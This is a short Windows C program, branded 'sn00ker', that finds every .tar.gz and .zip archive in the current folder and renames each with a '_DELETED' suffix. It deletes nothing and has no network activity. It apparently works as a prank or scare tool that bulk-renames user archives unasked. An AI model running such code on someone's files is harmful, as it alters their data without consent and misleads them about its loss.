#include <stdio.h>
#include <windows.h>
#include <string.h>

#define MAX_PATH_LENGTH 260  // Maximum file path length for Windows

void renameFile(const char *filePath, const char *newName) {
    if (rename(filePath, newName) == 0) {
        printf("File renamed successfully: %s -> %s\n", filePath, newName);
    } else {
        printf("Error renaming file: %s\n", filePath);
    }
}

int main() {
    WIN32_FIND_DATA findFileData;
    HANDLE hFind = FindFirstFile("*.tar.gz", &findFileData);

    printf("sn00ker (c) \n");
    printf("Searching files...\n");

    if (hFind == INVALID_HANDLE_VALUE) {
        printf("No .tar.gz files found.\n");
    } else {
        do {
            char newFileName[MAX_PATH_LENGTH];
            snprintf(newFileName, MAX_PATH_LENGTH, "%s_DELETED.tar.gz", findFileData.cFileName);
            renameFile(findFileData.cFileName, newFileName);
        } while (FindNextFile(hFind, &findFileData) != 0);
        FindClose(hFind);
    }

    hFind = FindFirstFile("*.zip", &findFileData);
    if (hFind == INVALID_HANDLE_VALUE) {
        printf("No .zip files found.\n");
    } else {
        do {
            char newFileName[MAX_PATH_LENGTH];
            snprintf(newFileName, MAX_PATH_LENGTH, "%s_DELETED.zip", findFileData.cFileName);
            renameFile(findFileData.cFileName, newFileName);
        } while (FindNextFile(hFind, &findFileData) != 0);
        FindClose(hFind);
    }

    return 0;
}
